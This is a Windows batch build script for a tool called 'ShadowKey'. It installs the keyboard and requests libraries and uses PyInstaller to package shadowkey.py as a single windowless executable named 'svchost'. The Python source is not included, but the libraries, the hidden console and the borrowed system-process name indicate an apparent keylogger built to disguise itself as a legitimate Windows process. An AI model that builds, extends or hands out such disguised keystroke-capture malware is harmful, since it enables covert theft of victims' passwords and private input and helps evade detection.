@echo off
echo [*] Building ShadowKey...
pip install pyinstaller keyboard requests
pyinstaller --noconfirm --onefile --noconsole --name "svchost" shadowkey.py
echo [*] Build complete: dist\svchost.exe
pause
